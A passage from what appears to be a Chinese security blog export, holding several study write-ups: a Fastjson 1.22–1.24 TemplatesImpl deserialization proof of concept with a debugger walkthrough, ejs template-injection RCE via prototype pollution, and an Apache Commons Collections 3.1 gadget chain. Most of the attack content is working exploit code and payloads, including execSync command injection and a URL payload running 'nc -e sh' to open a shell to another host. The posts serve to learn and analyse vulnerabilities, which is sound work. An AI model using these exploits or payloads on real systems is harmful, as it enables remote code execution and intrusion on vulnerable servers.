<h2 id="Json-字符串转-JsonObject"><a href="#Json-字符串转-JsonObject" class="headerlink" title="Json 字符串转 JsonObject"></a>Json 字符串转 JsonObject</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">json2jsonObj</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name1\&quot;:\&quot;mike\&quot;,\&quot;name2\&quot;:\&quot;john\&quot;,\&quot;key1\&quot;:123&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(object.getString(<span class="string">&quot;name1&quot;</span>));</span><br><span class="line">        System.out.println(object.getInteger(<span class="string">&quot;key1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420145133-0jcinsv.png" alt="image.png"></p>
<h1 id="Fastjson1-22-1-24反序列化"><a href="#Fastjson1-22-1-24反序列化" class="headerlink" title="Fastjson1.22-1.24反序列化"></a>Fastjson1.22-1.24反序列化</h1><h1 id="TEMPLATESIMPL环境-amp-复现"><a href="#TEMPLATESIMPL环境-amp-复现" class="headerlink" title="TEMPLATESIMPL环境&amp;复现"></a>TEMPLATESIMPL环境&amp;复现</h1><p>jdk 1.8<br>fastjson 1.22</p>
<p>先编写一个恶意类Evil，编译为class文件后放在本地，我们需要他的字节码</p>
<p>这个类的构造方法中会<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">helloworld</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>再<del>编写</del>（网上找了）一个调用了触发漏洞方法的客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bad_method</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_path</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\AEQAQ\\Desktop\\gc-tool\\fasjJ1\\target\\classes\\com\\fastjson\\exploit\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_code</span> <span class="operator">=</span> readClass(evil_path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evil_code+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        bad_method();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个客户端做的事情也很简单：</p>
<ol>
<li><p>读取class文件，并将其base64编码</p>
</li>
<li><p>创建json字符串 text1，其中<code>@type</code>设置为我们很熟悉的类<code>TemplatesImpl</code></p>
</li>
<li><p><code>JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</code></p>
<p> 这是漏洞触发的核心点</p>
</li>
<li><p>这里我们转化为对象的字符串，也就是包含了恶意class的字符串为</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAA...(省略一大段base64)&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">&#x27;_name&#x27;<span class="punctuation">:</span>&#x27;a.b&#x27;<span class="punctuation">,</span></span><br><span class="line">&#x27;_tfactory&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422202449-m5xmuiz.png" alt="image.png"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><blockquote>
<p>通过最简单的利用TemplatesImpl反序列化来学习fastjson1.22-1.24漏洞</p>
</blockquote>
<p>在<code>JSON.parseObject</code>处打上断点，下面主要分析这个方法中的流程</p>
<p>不得不说，这个调用还挺长的，所以我写的尽量详细点，对其中的一些方法和算法单独列出来分析，为以后回来看或者分析其他组件提供经验（吧。。）。</p>
<p>Fastjson反序列化的类方法调用关系</p>
<p>在这条利用TemplateImpl的利用链中，主要牵扯的还是靠左边的Deserializer</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422200212-mraj3zc.png" alt="image.png"></p>
<h2 id="JSON-parseObject"><a href="#JSON-parseObject" class="headerlink" title="JSON.parseObject"></a>JSON.parseObject</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422230857-4dz2cq4.png" alt="image.png"></p>
<p>先会对Feature数组进行遍历，并对mask值进行或运算，这里mask是有初值的，并将结果赋值给featureValues</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422231234-7m5244f.png" alt="image.png"></p>
<p>接着会返回一个DefaultJSONParser对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(input, config, featureValues);</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233123-exoj21l.png" alt="image.png"></p>
<p>可以看到我们的json字符串和features都被保存在这个parser里</p>
<p>其中lexer字段是一个JSONScanner对象，这里我们分析一下DefaultJSONParser对象的构造方法</p>
<h2 id="DefaultJSONParser构造方法"><a href="#DefaultJSONParser构造方法" class="headerlink" title="DefaultJSONParser构造方法"></a>DefaultJSONParser构造方法</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233653-k3i7ci4.png" alt="image.png"></p>
<p>可以看到这个构造方法中，根据我们传入的input和features，会先构造一个JSONScanner对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422234656-vtdedwz.png" alt="image.png"></p>
<p>这里由于ch是”{“，所以设置token为12</p>
<h2 id="DefaultJSONParser-parseObject-Type-type-Object-fieldName"><a href="#DefaultJSONParser-parseObject-Type-type-Object-fieldName" class="headerlink" title="DefaultJSONParser.parseObject(Type type,Object fieldName)"></a>DefaultJSONParser.parseObject(Type type,Object fieldName)</h2><p>接着调用parseObject方法，继续跟进</p>
<p>先返回token，这里为12，然后进到具体的处理部分</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233500-7oc40xw.png" alt="image.png"></p>
<p>先返回一个derializer，然后再调用它其中的方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235022-h4b5mcx.png" alt="image.png"></p>
<h2 id="JavaObjectDeserializer-deserialze"><a href="#JavaObjectDeserializer-deserialze" class="headerlink" title="JavaObjectDeserializer.deserialze"></a>JavaObjectDeserializer.deserialze</h2><p><code>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze</code></p>
<p>因此我们跟进deserialize方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235206-fn6d1d1.png" alt="image.png"></p>
<p>由于<code>parser.parseObject(clazz, (Object)null);</code>中传入的是Object类，所以这里跳过了if判断，直接进到return那一句里</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235523-fkrunuq.png" alt="image.png"></p>
<p>三元运算为false，进到<code>DefaultJSONParser.parse</code>方法中</p>
<h2 id="DefaultJSONParser-parse-java-lang-Object"><a href="#DefaultJSONParser-parse-java-lang-Object" class="headerlink" title="DefaultJSONParser.parse(java.lang.Object)"></a>DefaultJSONParser.parse(java.lang.Object)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235639-3b45azg.png" alt="image.png"></p>
<p>最终会进到case 12里面</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423001637-lxvvcqs.png" alt="image.png"></p>
<p>然后调用<code>DefaultJSONParser.parseObject</code>方法</p>
<h2 id="DefaultJSONParser-parseObject-java-util-Map-java-lang-Object"><a href="#DefaultJSONParser-parseObject-java-util-Map-java-lang-Object" class="headerlink" title="DefaultJSONParser.parseObject(java.util.Map, java.lang.Object)"></a>DefaultJSONParser.parseObject(java.util.Map, java.lang.Object)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423024252-2ecqiry.png" alt="image.png"></p>
<p>因为在DefaultJSONParser的构造方法中已经调用过一次next方法了，所以现在的ch是<code>&quot;</code>,34，所以会进到这个判断</p>
<p>scanSymbol则会取出<code>&quot;</code>之间的数据</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423002323-z2uqm4h.png" alt="image.png"></p>
<p>取出json对象的第一个key，也就是<code>@type</code></p>
<blockquote>
<p>还记得json中的<code>@type</code>所对应的数据是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，也就是我们要实例化的恶意类的类名。</p>
</blockquote>
<p>加载了TemplateImpl类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423002549-grnww83.png" alt="image.png"></p>
<p>然后接着往下走，就进入这个地方</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426005938-jjbq5e5.png" alt="image.png"></p>
<p>这里先通过scanSymbol来获取到<code>&quot;</code>间的数据，然后用<code>TypeUtils.loadClass</code>方法来加载这个类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426010128-2jlc4wl.png" alt="image.png"></p>
<p>最后在这个方法中实例化恶意类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426010227-ot3k7ef.png" alt="image.png"></p>
<h2 id="JavaBeanDeserializer-deserialze"><a href="#JavaBeanDeserializer-deserialze" class="headerlink" title="JavaBeanDeserializer.deserialze"></a>JavaBeanDeserializer.deserialze</h2><p>根据token为16，会先进到<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>方法中</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150433-agbqxc9.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150720-5xqscvg.png" alt="image.png"></p>
<p>随后进入到<code>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</code>中，此处filedType判断为了这个<code>class [[B</code>类型，然后再进入到下面的deserialze方法中</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427150930-3ctd6md.png" alt="image.png"></p>
<p>然后就取出了bytecodes字段<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151148-ymejgk5.png" alt="image.png"></p>
<p>进入这个setValue方法中，可以看到传入的object就是TempaltesImpl对象，然后value即构造的恶意字节码</p>
<p><code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151238-g8t7y7s.png" alt="image.png"></p>
<p>通过这个方法把<code>_bytecodes</code>加入到TemplatesImpl对象中</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427151455-vtm7tif.png" alt="image.png"></p>
<p>然后他会通过这个parseFiled方法逐个取出parser也就是json中的字段名<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427152148-xeeq7iv.png" alt="image.png"></p>
<p>直到解析这个字段，也就是<code>_outputProperties</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427152330-rsou476.png" alt="image.png"></p>
<p>最后在<code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code>中反射调用getOutputProperties方法，完成整个调用链调用，因为这里传入的object就是我们构造的恶意TemplatesImpl对象，这条攻击链可以在7d21中找到</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427153527-ier6p5m.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>ejs模板rce的初探</title>
    <url>/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="渲染处rce"><a href="#渲染处rce" class="headerlink" title="渲染处rce"></a>渲染处rce</h1><p><code>res.render(&#39;index&#39;);</code>中的一系列通过变量（其他漏洞达成）带来的模板注入。</p>
<h2 id="opts-outputFunctionName"><a href="#opts-outputFunctionName" class="headerlink" title="opts.outputFunctionName"></a>opts.outputFunctionName</h2><blockquote>
<p>ejs版本&lt;3.17</p>
</blockquote>
<p>如果可以通过原型链污染控制这个属性的值，就可以在渲染的模板中拼接任意命令。</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524191015-q4qyd8q.png" alt="image.png"></p>
<p> 在模板渲染过程中，这个属性一般是undefined。</p>
<p>注入payload如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">// After injection</span><br><span class="line">prepended += <span class="string">&#x27; var __tmp1; return global.process.mainModule.constructor._load(&#x27;</span>child_process<span class="string">&#x27;).execSync(&#x27;</span>di<span class="string">r&#x27;); __tmp2 = __append;&#x27;</span></span><br><span class="line">// 拼接了命令语句</span><br></pre></td></tr></table></figure>

<p>同理下面几个变量也都可以尝试，<code>opts.localsName</code> 和 <code>opts.destructuredLocals</code> 和 <code>opts.filename</code></p>
<p>修复：添加了一个正则，对上面几个涉及的变量进行过滤</p>
<p><a href="https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf">https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf</a></p>
<h2 id="opts-escapeFunction"><a href="#opts-escapeFunction" class="headerlink" title="opts.escapeFunction"></a>opts.escapeFunction</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> escapeFn = opts.<span class="property">escapeFunction</span>;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">      src = <span class="string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">        src = <span class="string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>同样是被拼接进了要渲染的源码中，造成了rce的情况，为了达成条件判断也需要控制其他的变量来达到rce</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;client&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;escapeFunction&quot;</span>: <span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span>,</span><br><span class="line">            <span class="string">&quot;compileDebug&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;client&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;escapeFunction&quot;</span>: <span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span>,</span><br><span class="line">            <span class="string">&quot;compileDebug&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="CVE-2022-29078"><a href="#CVE-2022-29078" class="headerlink" title="CVE-2022-29078"></a>CVE-2022-29078</h1><p><a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">https://eslam.io/posts/ejs-server-side-template-injection-rce/</a></p>
<p>原型链污染+模板注入，用的是outputFunction，但其实原型链污染的操作比较重要，如下构造payload我们就能在使用ejs3.17一下的版本中通过原型链污染达到rce</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;nc -e sh 127.0.0.1 1337&#x27;);s</span></span><br></pre></td></tr></table></figure>

<p>同样可以通过另一个escapeFunction来进行rce，此方法在3.17可行！</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/page?id=2&amp;settings[view%20options][client]=ture&amp;settings[view%20options][escapeFunction]=1;%20return%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27calc%27);&amp;settings[view%20options][compileDebug]=ture&amp;settings[view%20options][debug]=ture</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>nodejsSec</category>
      </categories>
      <tags>
        <tag>ejs模板rce</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Commons Collections 3.1链初探</title>
    <url>/2022/03/08/javacc31study/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Commons Collections利用链简称CC链，是Java反序列化学习中的重要一环。</p>
<p>本文初探最开始的一条链子，进行分析。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>jdk1.7.080 + Apache Commons Collections 3.1</p>
<p>jar包可以在mvnrepository找到，<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p>
<p>使用网上公开的payload编译运行，弹出计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;mate-calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChain</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">onlyElement</span> <span class="operator">=</span> (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着就要分析利用链</p>
<h1 id="InvokerTransformer-class"><a href="#InvokerTransformer-class" class="headerlink" title="InvokerTransformer.class"></a>InvokerTransformer.class</h1><p>这个漏洞产生的根源在于org.apache.commons.collections.functors.InvokerTransformer类中，存在这样一个反射调用的方法</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220306101448-wzum3gl.png" alt="image-20220306101448-wzum3gl.png"></p>
<p>不难看出，如果我们控制了这四个参数，利用反射，我们就可以调用任意方法，执行任意命令</p>
<p>input参数不必说，为传入的对象</p>
<p>iMethodName为获取的方法名称，iParamTypes为获取的方法参数类型</p>
<p>iParamTypes为调用方法时的参数</p>
<p>构造方法中可以直接传入</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220306101853-0asjzwi.png" alt="image-20220306101853-0asjzwi.png"></p>
<p>如此我们可以测试一下：<img src="https://o.130014.xyz/2022/03/08/image-20220306102341-sp8f9s2.png" alt="image-20220306102341-sp8f9s2.png"></p>
<p>但是这只局限于本地，要在远程，反序列化后调用恶意方法，得修改代码，因为远程不可能有最后transform调用传入Runtime实例的这一行。</p>
